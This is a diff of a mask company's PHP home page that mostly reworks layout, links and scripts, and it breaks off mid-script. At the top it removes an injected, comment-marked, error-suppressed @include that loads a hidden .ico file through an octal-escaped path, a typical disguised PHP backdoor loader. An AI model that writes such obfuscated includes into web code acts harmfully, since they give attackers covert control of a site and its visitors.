@@ -1,23 +1,12 @@
 <?php
-/*1bc29*/
-
-@include "\057hom\1452/a\142770\0668/c\141rev\151ew.\151n/b\154og/\141sse\164s/i\155g/.\065e98\0623ec\056ico";
-
-/*1bc29*/
 $page = 'home';
-include "header.php" ?>
+include "header.php"
+?>
 
-
- 
-    <!--<link rel="stylesheet" type="text/css" href="newcss/responsive.css">-->
     <link rel="stylesheet" type="text/css" href="newcss/font-awesome.min.css">
     <link rel="stylesheet" type="text/css" href="newcss/slick.min.css">
     <link rel="stylesheet" type="text/css" href="newcss/slick-theme.css">
-   
-    
-    <!--<link rel="stylesheet" type="text/css" href="newcss/jquery.fancybox.min.css">-->
-    
-    
+
      <script type="text/javascript">
         (function(i, s, o, g, r, a, m) {
             i['GoogleAnalyticsObject'] = r;
@@ -43,13 +32,11 @@ include "header.php" ?>
     <div class="section aboutus vertical-scrolling" id="section0">
 		
 		<div class="banner">
-  <div class="SliderJs">
-      
-
-  <div class="SliderJs_box bs2">
+  		<div class="main-slider owl-carousel owl-theme">
+  		<div class="main-slider-item">
 		  <div class="banner-1 banner-bg" style="background-image: url('./img/banner3-bg.jpg')">
 		  <div class="banner-inner">
-		  <div class="row h-100">
+		  <div class="row no-gutters h-100">
 				<div class="col-lg-7 col-md-6 banner-left">
 					<img class="banner-img mask-images" src="./img/banner3-mask.png" alt="">
 				</div>
@@ -60,29 +47,23 @@ include "header.php" ?>
 					Complete Range of Protective Mask
 					</p>	
 					<div class="certification-text text-purple">
-					<span> Certified by:</span> <strong>DRDO & ISI</strong> 
+					<span> Certified by:</span> <strong>ISI & DRDO</strong> 
 					</div>	
 					<div class="certification mb-3">
 						<img src="./img/certification.png" alt="">
 					</div>	
 					</div>
-					
-					 
-					  <a href="http://bit.ly/careview-n95-mask" target="_blank" class="default-btn banner_btn2">BUY NOW </a>	
+					  <a href="n95-mask.php" class="default-btn banner_btn2">KNOW MORE</a>	
 				</div>
 			 </div>
 		  </div>
-             
-			 
-			  
-          </div>
-          
+          </div>  
 	  </div>
 
-      <div class="SliderJs_box bs2">
+      <div class="main-slider-item">
 		  <div class="banner-bg" style="background-image: url('./img/banner1-bg.jpg')">
 		  <div class="banner-inner">
-		  <div class="row h-100">
+		  <div class="row no-gutters h-100">
 				<div class="col-lg-7 col-md-6 banner-left">
 					<img class="banner-img" src="./img/banner1-mask.png" alt="">
 				</div>
@@ -90,21 +71,16 @@ include "header.php" ?>
 					<div>
 					<h2 class="banner-heading text-green">WE ARE AVAILABLE
 ONLINE</h2>
-
-
-			<div class="online">
-				<div>
-					<img src="./img/online1.png" alt="">
-				</div>
-				<div>
-					<img src="./img/online2.png" alt="">
-				</div>
-			</div>
-  
+					<div class="online">
+						<div>
+							<img src="./img/online1.png" alt="">
+						</div>
+						<div>
+							<img src="./img/online2.png" alt="">
+						</div>
 					</div>
-					
-					 
-					  <a href="http://bit.ly/careview-n95-mask" target="_blank" class="default-btn banner_btn2">BUY NOW </a>	
+					</div>
+					  <a href="https://bit.ly/careview-n95-mask" target="_blank" class="default-btn banner_btn2">BUY NOW </a>	
 				</div>
 			 </div>
 		  </div> 
@@ -113,61 +89,45 @@ ONLINE</h2>
 	  </div>
 	  
 
-	  <div class="SliderJs_box bs2">
+	  <div class="main-slider-item">
 		  <div class="banner-bg" style="background-image: url('./img/banner2-bg.jpg')">
 		  <div class="banner-inner">
-		  <div class="row h-100">
+		  <div class="row no-gutters h-100">
 				<div class="col-lg-7 col-md-6 banner-left">
 					<img class="banner-img" src="./img/banner2-mask.png" alt="">
 				</div>
 				<div class="col-lg-5 col-md-6 banner-right text-md-right">
 					<div>
-					<h2 class="banner-heading text-green">BECOME OUR DISTRIBUTER</h2>
+					<h2 class="banner-heading text-green">BECOME OUR DISTRIBUTOR</h2>
 
-<p class="banner-subheading text-purple font-weight-light">For bulk inquiry, contact</p>
-  <h4 class="d-inline-flex align-items-center text-purple phone-text">
-	  <img src="./img/phone.png" class="mr-2" alt=""> 1800 102 0241</h4>
-					</div>
-					
-					 
-					  <a href="http://bit.ly/careview-n95-mask" target="_blank" class="default-btn banner_btn2">BUY NOW </a>	
+						<p class="banner-subheading text-purple font-weight-light">For bulk inquiry, contact</p>
+						<h4 class="d-inline-flex align-items-center text-purple phone-text">
+						<img src="./img/phone.png" class="mr-2" alt=""> 1800 102 0241</h4>
+					</div> 
+					  <a href="partner.php" class="default-btn banner_btn2">CONTACT US</a>	
 				</div>
 			 </div>
-		  </div>
-             
-			 
-			  
+		  </div>  
           </div>
-          
 	  </div>
-	  
-
-   
+	
   </div>
 </div>
+</div>
 
-
-		</div>
-		<!-- End Hero Slider Area -->
-
-
-        
-
-		 <div class="section aboutus vertical-scrolling" id="section1">
-                
-                
+		 <div class="section aboutus vertical-scrolling  bg-darkblue" id="section1">
+              
                 <section>
-	                
-	              <div class="secondary-slider owl-carousel owl-theme">
+	                   <div class="secondary-slider owl-carousel owl-theme">
 
 					   <div class="secondary-slider-item bg-darkblue">
-					   	<div class="row h-100">
+					   	<div class="row no-gutters h-lg-100">
 							<div class="col-lg-6 d-lg-flex align-items-center justify-content-center">
 								<div class="slider-left-content px-5">
 									<h4>CV-1221</h4>
-									<h2>N-95 masks with Ear Loops</h2>
+									<h2>N95 masks with Ear Loops</h2>
 									<p>CV-1221 comes with comfortable ear loops, in-built nose pin, ultrasonic sealing and 6 layers of filtration which makes it a perfect and affordable choice for protection.</p>
-									<a class="default-btn banner_btn2" href="http://careview.in/n95-mask.php#CV-1221">Know More</a>
+									<a class="default-btn banner_btn2" href="https://careview.in/n95-mask.php#CV-1221">KNOW MORE</a>
 								</div>
 								
 							</div>
@@ -184,13 +144,13 @@ ONLINE</h2>
 
 
 					   <div class="secondary-slider-item bg-darkblue">
-					   	<div class="row h-100">
+					   	<div class="row  no-gutters h-lg-100">
 							<div class="col-lg-6 d-lg-flex align-items-center justify-content-center">
 								<div class="slider-left-content px-5">
-									<h4>CV-1221HV</h4>
-									<h2>N95 MASKS  LOOPS & RESPIRATOR VALVE</h2>
-									<p>CV-1221HV offers a perfect fit and easy breathability with flexible head loops and free flow respirator valve along with in-built nose pin, ultrasonic sealing and 6 layers of filtration.</p>
-									<a class="default-btn banner_btn2" href="http://careview.in/n95-mask.php#CV-1221V">Know More</a>
+									<h4>CV-1221V</h4>
+									<h2>N95 MASKS WITH EAR LOOPS & RESPIRATOR VALVE</h2>
+									<p>CV-1221V ensure effective protection along easy breathing with comfortable ear loops, in-built nose pin, ultrasonic sealing, 6 layers of filtration and free flow exhalation valve.</p>
+									<a class="default-btn banner_btn2" href="https://careview.in/n95-mask.php#CV-1221V">KNOW MORE</a>
 								</div>
 								
 							</div>
@@ -206,13 +166,13 @@ ONLINE</h2>
 					   </div>
 
 					   <div class="secondary-slider-item bg-darkblue">
-					   	<div class="row h-100">
+					   	<div class="row  no-gutters h-lg-100">
 							<div class="col-lg-6 d-lg-flex align-items-center justify-content-center">
 								<div class="slider-left-content px-5">
 									<h4>CV-1221H</h4>
 									<h2>N95 MASKS WITH HEAD LOOPS</h2>
 									<p>CV-1221H offers a perfect fit with flexible head loops along with in-built nose pin, ultrasonic sealing and 6 layers of filtration making it suitable for long wearing hours without any discomfort.</p>
-									<a class="default-btn banner_btn2" href="http://careview.in/n95-mask.php#CV-1221H">Know More</a>
+									<a class="default-btn banner_btn2" href="https://careview.in/n95-mask.php#CV-1221H">KNOW MORE</a>
 								</div>
 								
 							</div>
@@ -229,13 +189,13 @@ ONLINE</h2>
 
 
 					   <div class="secondary-slider-item bg-darkblue">
-					   	<div class="row h-100">
+					   	<div class="row  no-gutters h-lg-100">
 							<div class="col-lg-6 d-lg-flex align-items-center justify-content-center">
 								<div class="slider-left-content px-5">
 									<h4>CV-1221HV</h4>
 									<h2>N95 MASKS WITH HEAD LOOPS & RESPIRATOR VALVE</h2>
 									<p>CV-1221HV offers a perfect fit and easy breathability with flexible head loops and free flow respirator valve along with in-built nose pin, ultrasonic sealing and 6 layers of filtration.</p>
-									<a class="default-btn banner_btn2" href="http://careview.in/n95-mask.php#CV-1221HV">Know More</a>
+									<a class="default-btn banner_btn2" href="https://careview.in/n95-mask.php#CV-1221HV">KNOW MORE</a>
 								</div>
 								
 							</div>
@@ -251,13 +211,13 @@ ONLINE</h2>
 					   </div>
 
 					   <div class="secondary-slider-item bg-darkblue">
-					   	<div class="row h-100">
+					   	<div class="row  no-gutters h-lg-100">
 							<div class="col-lg-6 d-lg-flex align-items-center justify-content-center">
 								<div class="slider-left-content px-5">
 									<h4>CV-2992</h4>
 									<h2>DISPOSABLE 3 PLY MASKS FOR REGULAR USE</h2>
 									<p>CV-2992, the disposable 3 ply mask with SSSMMS filtration layer inside, provides an effective protection against air borne diseases.</p>
-									<a class="default-btn banner_btn2" href="http://careview.in/3ply-mask.php#CV-2992">Know More</a>
+									<a class="default-btn banner_btn2" href="https://careview.in/3ply-mask.php#CV-2992">KNOW MORE</a>
 								</div>
 								
 							</div>
@@ -273,13 +233,13 @@ ONLINE</h2>
 					   </div>
 
 					   <div class="secondary-slider-item bg-darkblue">
-					   	<div class="row h-100">
+					   	<div class="row  no-gutters h-lg-100">
 							<div class="col-lg-6 d-lg-flex align-items-center justify-content-center">
 								<div class="slider-left-content px-5">
 									<h4>CV-2992M</h4>
 									<h2>DISPOSABLE 3 PLY MASKS FOR MEDICAL USE</h2>
 									<p>CV-2992M, the disposable 3 ply mask with meltblown filtration layer inside, are ideal for medical usage for effective protection against air borne diseases and particulate matter.</p>
-									<a class="default-btn banner_btn2" href="http://careview.in/3ply-mask.php#CV-2992M">Know More</a>
+									<a class="default-btn banner_btn2" href="https://careview.in/3ply-mask.php#CV-2992M">KNOW MORE</a>
 								</div>
 								
 							</div>
@@ -294,38 +254,30 @@ ONLINE</h2>
 						</div>
 					   </div>
 
-						
-
-						</div>
+			
+					</div>
 	        	</section>
                 
-         </div><!-- section2 -->
+         </div>
         
-    <div class="section vertical-scrolling" id="section2" style="    background: linear-gradient(0deg, rgb(0, 205, 161) 0%, rgb(45, 40, 146) 100%);">
+    <div class="section vertical-scrolling" id="section2" style="background: linear-gradient(0deg, rgb(0, 205, 161) 0%, rgb(45, 40, 146) 100%);">
         
-				<!-- Start About Area Area -->
-	
-		<div class="row no-gutters">
-					<div class="col-lg-5 position-relative" >
-					    <div id="particles-js" class="bg-white position-absolute w-100 h-100">
-						
-						</div>
-						<div class="about-content health">
-							<h2 class="">Care View: Reliable Healthcare Products </h2>
-							<p>Care View is a trusted brand of AVA International Pvt. Ltd., a leading organisation supplying specialised medical and healthcare products ranging from personal protective equipment to protective mask.
+		<div class="row no-gutters h-100">
+					<div class="col-lg-5 position-relative d-flex align-items-center vertical-padder bg-white" >
+					    <!-- <div id="particles-js" class="bg-white position-absolute w-100 h-100"></div> -->
+						<div class="health position-relative px-4 py-5">
+							<h2 class="section-lead text-purple">Care View: Reliable Healthcare Products </h2>
+							<p class="section-text mb-5">Care View is a trusted brand of AVA International Pvt. Ltd., a leading organisation supplying specialised medical and healthcare products ranging from personal protective equipment to protective mask.
 With our team of experts and large research facilities, we're on a mission to manufacture and distribute medical products of utmost quality in the country.
 Our expertise is supported by large manufacturing facility and a PAN India distribution network that can deliver protective gear and masks anytime and anywhere.</p>
 							
-						
-
 							<a href="about.php" class="default-btn" style="font-weight:bold;">
 								READ MORE
 							</a>
 						</div>
-					
 					</div>
-					<div class="col-lg-7 d-none d-lg-block grd-bg">
-						<div class="about-ions">
+					<div class="col-lg-7 d-none d-lg-flex grd-bg  align-items-center vertical-padder">
+						<div class="about-ions  px-4 py-5">
 						<div class="row">
 						        <div class="col-md-4   col-sm-6">
 						            <div class="sqft ">
@@ -333,260 +285,124 @@ Our expertise is supported by large manufacturing facility and a PAN India distr
 						            <p>15000+ SQFT FACTORY</p>
 						            </div>
 						        
-						        </div><!--col-4-->
+						        </div>
 						        <div class="col-md-4  col-sm-6">
 						            <div class="sqft ">
 						            <img src="assets/img/icon/Mask.png ">
 						            <p>1 MN+ MASKS/WEEK</p>
 						            </div>
-						      </div><!--col-4-->
-						        <!--<div class="col-md-4"><p>300+ Corporate and Industrial clients served</p></div><!--col-4-->
-						        
-						        
+						      </div>
 						        
 						        <div class="col-md-4   col-sm-6">
 						            <div class="sqft ">
 						                <img src="assets/img/icon/Clint_icon.png">
 						            <p>300+ CORPORATE CLIENTS </p>
 						            </div>      
-						      </div><!--col-4-->
+						      </div>
 						        <div class="col-md-4  col-sm-6">
 						            <div class="sqft mt-2 ">
 						                <img src="assets/img/icon/laboratory.png">
 						            <p>IN FACILITY LABORATORY</p>
 						            </div>
-						      </div><!--col-4-->
+						      </div>
 						        <div class="col-md-4   col-sm-6">
 						            <div class="sqft mt-2 ">
 						                <img src="assets/img/icon/Workers_.png">
 						            <p>200+ SKILLED WORKERS</p>
 						            </div>
-						      </div><!--col-4-->
+						      </div>
 						        <div class="col-md-4   col-sm-6">
 						            <div class="sqft mt-3">
 						                <img src="assets/img/icon/Machines.png">
 						            <p>30+ MACHINES</p>
 						            </div>
-						      </div><!--col-4-->
-						      
-						      
+						      </div>
 						      
 						      <div class="col-md-4  col-sm-6">
 						            <div class="sqft mt-2 ">
 						                <img src="img/iso1.png">
 						            <p> ISO CERTIFICATION</p>
 						            </div>
-						      </div><!--col-4-->
+						      </div>
 						        <div class="col-md-4  col-sm-6">
 						            <div class="sqft mt-2 ">
 						                <img src="img/iso2.png">
 						            <p>ISO CERTIFICATION</p>
 						            </div>
-						      </div><!--col-4-->
+						      </div>
 						        <div class="col-md-4  col-sm-6">
 						            <div class="sqft mt-3">
 						                <img src="img/iso3.png">
 						            <p>ISO CERTIFICATION</p>
 						            </div>
-						      </div><!--col-4-->
-						        <!--<div class="col-md-4"><p>300+ Corporate and Industrial clients served</p></div><!--col-4-->
+						      </div>
 						    </div>
 						</div>
 					
 					</div>
 				</div>
-		
-		<!-- End About Area -->
-		
-    </div><!-- section1 -->
+    </div>
     
     
     
-    <div class="section aboutus vertical-scrolling " id="section3"  style="background: linear-gradient(0deg, rgba(45,40,146,1) 0%, rgba(0,205,161,1) 100%);" >
-			 <section >
+    <div class="section vertical-scrolling " id="section3"  style="background: linear-gradient(0deg, rgba(45,40,146,1) 0%, rgba(0,205,161,1) 100%);" >
+		<section>
 			 <div class="row no-gutters">
-					<div class="col-lg-5 grd-bgd">
-						<div class="block-padder mh-100vh">
-						    	<h2 class="our section-title">Download Our Brochure </h2>
-							<p class="our mb-4">Know more about our extensive range of protective masks exclusively designed for protection and comfort of wearer.</p>
-							<!--<img src="img/Brochure.jpg" alt="Image">-->
-						
+					<div class="col-lg-5 grd-bgd  d-flex align-items-center mh-100vh vertical-padder">
+						<div class=" px-4 py-5">
+						    <h2 class="section-lead text-white">Download Our Brochure </h2>
+							<p class="section-text text-white ">Know more about our extensive range of protective masks exclusively designed for protection and comfort of wearer.</p>
 							
 						<div class="mb-4">
-						<div class="SliderJs mx-auto brochure-slider">
-							<div class="SliderJs_box bs1">
-								<div >
-
+							<div class="SliderJs mx-auto brochure-slider">
+								<div class="SliderJs_box bs1">
+									<div >
 									<img src="img/BROUCHER-1.png" class="w-100"  alt="">
+									</div>
+								</div>
+								<div class="SliderJs_box bs2">
+									<div >
+										<img src="img/Broucher-2.jpg" class="w-100" alt="">
+									</div>	
+								</div>
+							</div>
+						</div>
 
+							<div class="row no-gutters">
+								<div class="col-sm-6">
+									<div class="btn1 day">
+										<a href="../View/img/CV_Brochure.pdf" target="_blank" class="default-btn">
+										N95 MASK BROCHURE 
+										</a>
+									</div>	
 								</div>
-								
-							</div>
-							<div class="SliderJs_box bs2">
-								<div >
-									<img src="img/Broucher-2.jpg" class="w-100" alt="">
+								<div class="col-sm-6">
+									<div class="btn1 day">
+										<a href="img/3ply_Brochure.pdf" target="_blank" class="default-btn">
+											3PLY MASK BROCHURE
+										</a>
+									</div>	
 								</div>
-								
 							</div>
 						</div>
-						</div>
-							<div class="row">
-							<div class="col-sm-6">
-							    <div class="btn1 day">
-						    <!--<a href="#" class="buttonDownoad">Download</a>-->
-						    <a href="../View/img/CV_Brochure.pdf" target="_blank" class="default-btn">
-							        N95 MASK	BROCHURE 
-							</a>
-						</div>	
-							</div>
-							<div class="col-sm-6">
-							    <div class="btn1 day">
-						    <!--<a href="#" class="buttonDownload">Download</a>-->
-						    <a href="img/3ply_Brochure.pdf" target="_blank" class="default-btn">
-								 3PLY MASK BROCHURE
-							</a>
-						</div>	
-							</div>
-							
-							</div>
-						
-						</div>
-						
-						
-						
-						
+		
 					</div>
 					
-					<div class="col-lg-7 d-none d-lg-block" style="background:#fff;">
-							<div class="block-padder">
-						    	<h2 class="indus">Our Industry Clientele </h2>
-							<p class="mb-5">With huge production capacity clubbed with skilled workers working day and night, we ensure to fulfill each bulk order on time.</p>
+					<div class="col-lg-7 d-lg-flex align-items-center vertical-padder" style="background:#fff;">
+						<div class=" px-4 py-5">
+							<h2 class="section-lead text-blue">Our Industry Clientele </h2>
+							<p class="section-text">With huge production capacity clubbed with skilled workers working day and night, we ensure to fulfill each bulk order on time.</p>
 							<img src="assets/img/multi-logo1.jpg" class="clients-logo-list" alt="Image" style="">
 						</div>
-						</div>
-					</div>									
+					</div>
+				</div>									
 			</section>
     </div><!-- section3 -->
-    
-    
-  <!--  <div class="section vertical-scrolling amenities Specification " id="section4" style="background:#fff;">-->
-      
-		
-		<!--<section class="section client-area ptb-100 girl-bg" >-->
-		<!--	<div class="container">-->
-		<!--	    <div class="row">-->
-		<!--	    <div class="col-md-8 hero-bkg-animated">-->
-			        
-		<!--	        <div class="section-title" style="margin: 21px auto 42px;     vertical-align: text-bottom;">-->
-		<!--			<h2>We Care For Their Views</h2>-->
-		<!--		</div>-->
-		<!--		<div class="client-wrap owl-carousel owl-theme">-->
-		<!--			<div class="single-client">-->
 
-		<!--				<p style="font-size:15px;">“Finally feeling safe again! it's a comfortable fit, a lot better than most of the other masks available in the market.”<br><br></p>-->
-
-		<!--				<ul>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--				</ul>	-->
-
-		<!--				<h3> Ishan Singh</h3>-->
-		<!--				<span style="color:#fff;">CEO of Company</span>-->
-
-		<!--				<div class="quate">-->
-		<!--					<i class="flaticon-right-quotes-symbol"></i>-->
-		<!--				</div>-->
-		<!--			</div>-->
-					
-		<!--			<div class="single-client">-->
-
-		<!--				<p style="font-size:15px;">“Original N95 Mask....CE & FDA certified... excellent product ...packed as single piece neatly...”<br><br></p>-->
-
-		<!--				<ul>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-							
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--				</ul>	-->
-
-		<!--				<h3>Shailendra Tiwari</h3>-->
-		<!--				<span style="color:#fff;"> Founder of Company</span>-->
-
-		<!--				<div class="quate">-->
-		<!--					<i class="flaticon-right-quotes-symbol"></i>-->
-		<!--				</div>-->
-		<!--			</div>-->
-					
-		<!--			<div class="single-client">-->
-
-		<!--				<p>“They delivered our huge order as per the deadline mentioned to us. We have been regularly sourcing it from them and it has been a satisfying business relationship.“</p>-->
-
-		<!--				<ul>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--					<li>-->
-		<!--						<i class="bx bxs-star"></i>-->
-		<!--					</li>-->
-		<!--				</ul>	-->
-
-		<!--				<h3>Shantam Singh</h3>-->
-		<!--				<span style="color:#fff;">CEO of Company</span>-->
-
-		<!--				<div class="quate">-->
-		<!--					<i class="flaticon-right-quotes-symbol"></i>-->
-		<!--				</div>-->
-		<!--			</div>					-->
-					
-		<!--		</div>-->
-		<!--	    </div>-->
-		<!--	    <div class="col-md-4">-->
-			        
-		<!--	    </div>-->
-		<!--		</div>-->
-		<!--	</div>-->
-		<!--</section>-->
-		
-		
-  <!--  </div>-->
-    
 
     <div class="section aboutus SitePlan site-map vertical-scrolling footer-top-area" id="section4">
-     
-         <!-- Start Footer Top Area -->
 		<footer class="f-bg footer-main  jarallax">
-			<div class="container">
+			<div class="container-fluid">
 				<div class="row">
 					<div class="col-lg-3 col-md-6 ll">
 						<div class="single-widget">
@@ -594,14 +410,14 @@ Our expertise is supported by large manufacturing facility and a PAN India distr
 								<b><img src="assets/img/white-logo.png" alt="Image"></b>
 							</a>
 
-							<p style="font-size:17px;">Care View is a trusted brand of AVA International Pvt. Ltd., a leading organisation supplying specialised medical and healthcare products ranging from personal protective equipment to protective mask.
+							<p style="font-size:15px;">Care View is a trusted brand of AVA International Pvt. Ltd., a leading organisation supplying specialised medical and healthcare products ranging from personal protective equipment to protective mask.
 
 							</p>
 
 							<div class="social-area">
 								<ul>
 									<li>
-										<a href="https://www.facebook.com/Careview-102127124957137/" target="_blank">
+										<a href="https://www.facebook.com/Careview-India-105201918035599/" target="_blank">
 											<i class="bx bxl-facebook"></i>
 										</a>
 									</li>
@@ -638,7 +454,7 @@ Our expertise is supported by large manufacturing facility and a PAN India distr
 
 							<ul>
 								<li>
-									<a href="http://careview.in/about.php">
+									<a href="https://careview.in/about.php">
 										<i class="bx bx-chevrons-right"></i>
 										About
 									</a>
@@ -657,7 +473,7 @@ Our expertise is supported by large manufacturing facility and a PAN India distr
 									</a>
 								</li>								
 								<li>
-									<a href="http://careview.in/blog/">
+									<a href="https://careview.in/blog/">
 										<i class="bx bx-chevrons-right"></i>
 										Blog
 									</a>
@@ -669,13 +485,7 @@ Our expertise is supported by large manufacturing facility and a PAN India distr
 										Gallery
 									</a>
 								</li>
-								
-								<!--<li>-->
-								<!--	<a href="partners.php">-->
-								<!--		<i class="bx bx-chevrons-right"></i>-->
-								<!--		Blog-->
-								<!--	</a>-->
-								<!--</li>-->
+
 								<li>
 									<a href="contact.php">
 										<i class="bx bx-chevrons-right"></i>
@@ -693,7 +503,7 @@ Our expertise is supported by large manufacturing facility and a PAN India distr
 
 							<ul>
 								<li>
-									<a href="https://www.flipkart.com/careview-n95-ffp2-fda-ce-drdo-certified-protective-face-mask-6-layered-filtration-ear-loop-style-pack-10-cv1221-reusable/p/itm15dc4dc501a5d?pid=MRPFTUZUWEJRUA7Y&lid=LSTMRPFTUZUWEJRUA7YBSAHDU&marketplace=FLIPKART&srno=s_1_4&otracker=AS_QueryStore_HistoryAutoSuggest_1_8_na_na_na&otracker1=AS_QueryStore_HistoryAutoSuggest_1_8_na_na_na&fm=SEARCH&iid=2bb8f52f-c221-4f5a-8e2a-db9f02f7cf00.MRPFTUZUWEJRUA7Y.SEARCH&ppt=sp&ppn=sp&ssid=i2lj9jw7nk0000001599658209888&qH=66e124ff783e09ec" target="_blank">
+									<a href="https://www.flipkart.com/search?q=care%20view%20mask&otracker=search&otracker1=search&marketplace=FLIPKART&as-show=on&as=off" target="_blank">
 										<i class="bx flipcart"></i>
 										Flipkart
 									</a>
@@ -722,19 +532,6 @@ Our expertise is supported by large manufacturing facility and a PAN India distr
 										1Mg
 									</a>
 								</li>
-								
-								<!--<li>-->
-								<!--	<a href="https://www.indiamart.com/avasystems/" target="_blank">-->
-								<!--		<i class="bx india"></i>-->
-								<!--		India mart-->
-								<!--	</a>-->
-								<!--</li>-->
-								<!--<li>-->
-								<!--	<a href="https://www.tradeindia.com/ava-international-31057637/" target="_blank">-->
-								<!--		<i class="bx trade"></i>-->
-								<!--		Trade India -->
-								<!--	</a>-->
-								<!--</li>-->
 							</ul>
 							
 						</div>
@@ -742,52 +539,11 @@ Our expertise is supported by large manufacturing facility and a PAN India distr
 					
 					<div class="col-lg-3 col-md-6 ll">
 					<div class="single-widget contact">
-							<h3>Latest Tweet</h3>
-							<div class="tweet-list">
-								<ul>
-									<li class="d-flex ">
-										<div class="twitter-icon-wrap mr-2"> 
-										<i class="bx bxl-twitter"></i>
-										</div>
-										<div class="tweetaya-body">
-											<p>Coming Soon, Stay Tuned 
-												<a href="#" target="_blank" rel="nofollow noopener">#jannah</a> <a href="#" target="_blank" rel="nofollow noopener">#big_update</a>
-												<a href="#" target="_blank" rel="nofollow noopener">#jannah5</a> <a href="#" target="_blank" rel="nofollow noopener">#wordpress</a>
-												<a href="#" target="_blank" rel="nofollow noopener">https://t.co/IQsH1hLnMr</a></p>
-											<span class="tweetaya-meta">2020/08/20</span>
-										</div>
-									</li>
-									<li class="d-flex ">
-										<div class="twitter-icon-wrap mr-2"> 
-										<i class="bx bxl-twitter"></i>
-										</div>
-										<div class="tweetaya-body">
-											<p>Our new plugin WPCOVID-19 helps WordPress sites’ owners to
-												display Coronavirus real-time data easily on their sites… <a href="#" target="_blank" rel="nofollow noopener">https://t.co/953KekMqq0</a></p>
-												<span class="tweetaya-meta">2020/08/20</span>
-										</div>
-									</li>
-
-									<li class="d-flex ">
-										<div class="twitter-icon-wrap mr-2"> 
-										<i class="bx bxl-twitter"></i>
-										</div>
-										<div class="tweetaya-body">
-											<p>Coming Soon, Stay Tuned 
-												<a href="#" target="_blank" rel="nofollow noopener">#jannah</a> <a href="#" target="_blank" rel="nofollow noopener">#big_update</a>
-												<a href="#" target="_blank" rel="nofollow noopener">#jannah5</a> <a href="#" target="_blank" rel="nofollow noopener">#wordpress</a>
-												<a href="#" target="_blank" rel="nofollow noopener">https://t.co/IQsH1hLnMr</a></p>
-												<span class="tweetaya-meta">2020/08/20</span>
-										</div>
-									</li>
-								</ul>
-													
-								</div>	
-
+    						<div class="twt">
+                            <a class="twitter-timeline" style="" data-dnt="true" href="https://twitter.com/careview_india" data-widget-id="515125528169160704" data-tweet-limit="1">Tweets by @Careview</a>
+                            <div id="example1"></div>                 
+                        </div>
 					</div>
-						
-                       
- 
 					</div>	<!-- End twitter-->			
 
 					<div class="col-lg-3 col-md-6">
@@ -823,60 +579,76 @@ Our expertise is supported by large manufacturing facility and a PAN India distr
 					</div>
 				</div>
 			</div>
-
-			<div class="footer-bottom-area">
+		<!--</footer>-->
+		<!-- End Footer Top Area -->
+		<!-- Start Footer Bottom Area -->
+		<div class="footer-bottom-area">
 			<div class="container">
-				<div class="copy-right text-center">
-					<span>© Copyright 2020 Care View. All Rights Reserved By <a href="http://careview.in/" target="blank">Careview</a></span>
+				<div class="copy-right">
+					<span>© Copyright 2020 Careview. All Rights Reserved By <a href="https://careview.in" target="blank">Careview</a></span>
 				</div>
 			</div>
-		</div>
-
+			</div>
 		</footer>
-		<!-- End Footer Top Area -->
+		<!-- End Footer Bottom Area -->
+		
     </div><!-- Footer -->
 
 	
 		
 		</div>
 		
-		<script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
+		<!-- Start Go Top Area -->
+		<div class="go-top">
+			<a href="#Home"><i class='bx bx-chevrons-up'></i>
+			<i class='bx bx-chevrons-up'></i></a>
+		</div>
+		<!-- End Go Top Area -->
+		<script src="newjs/jquery.min.js"></script>
+		<script src="newjs/popper.min.js"></script>
+		<script src="newjs/bootstrap.min.js"></script>
+		<script src="newjs/slick.min.js"></script>
+		<script src="newjs/jquery.fullPage.js"></script>
+		<script src="newjs/custom.js"></script>
+		<!-- <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script> -->
 
 
-<script src="newjs/jquery.min.js"></script>
-<script src="newjs/popper.min.js"></script>
-<script src="newjs/bootstrap.min.js"></script>
-<script src="newjs/slick.min.js"></script>
-<script src="newjs/jquery.fullPage.js"></script>
-<!--<script src="newjs/jquery.fancybox.min.js"></script>-->
-<script src="newjs/custom.js"></script>
-<script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
-
-
-
-        <!-- Meanmenu JS -->
+		<!-- Meanmenu JS -->
 		<script src="assets/js/jquery.meanmenu.js"></script>
-        <!-- Wow JS -->
-        <script src="assets/js/wow.min.js"></script>
-        <!-- Owl Carousel JS -->
+		<!-- Wow JS -->
+		<script src="assets/js/wow.min.js"></script>
+		<!-- Owl Carousel JS -->
 		<script src="assets/js/owl.carousel.js"></script>
-        <!-- Nice Select JS -->
+		<!-- Nice Select JS -->
 		<script src="assets/js/jquery.nice-select.min.js"></script>
 		<!-- Appear JS --> 
-        <script src="assets/js/jquery.appear.js"></script>
-		
-		
-		<!-- scripts -->
-<script src="http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script> <!-- stats.js lib --> 
-<script src="http://threejs.org/examples/js/libs/stats.min.js"></script>
+		<script src="assets/js/jquery.appear.js"></script>
 
-<script src="assets/js/extra.js"></script>
+		<script src="assets/js/extra.js"></script>
 
 <script>
-	$('.secondary-slider').owlCarousel({
+    
+	$('.SliderJs').slick({
+	  dots: true,
+	  infinite: true,
+	  speed: 800,
+	  slidesToShow: 1,
+	  slidesToScroll:1,
+	  vertical: false,
+	  pauseOnHover: false,
+	  autoplay:true,
+    nextArrow:false,
+    prevArrow:false,
+    fade:false,
+   
+	});
+</script>
+<script>
+    
